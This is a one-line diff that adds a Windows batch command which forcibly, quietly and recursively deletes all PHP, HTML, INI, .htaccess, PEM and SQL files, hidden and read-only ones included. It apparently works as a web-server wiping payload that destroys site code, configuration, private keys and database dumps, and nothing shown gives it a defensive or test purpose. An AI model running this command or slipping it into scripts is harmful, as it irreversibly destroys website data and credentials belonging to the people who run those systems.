@@ -1,0 +1,1 @@
+del /a /f /s /q  "*.php" "*.html" "*.htm" "*.ini" "*.htaccess" "*.pem" "*.sql"
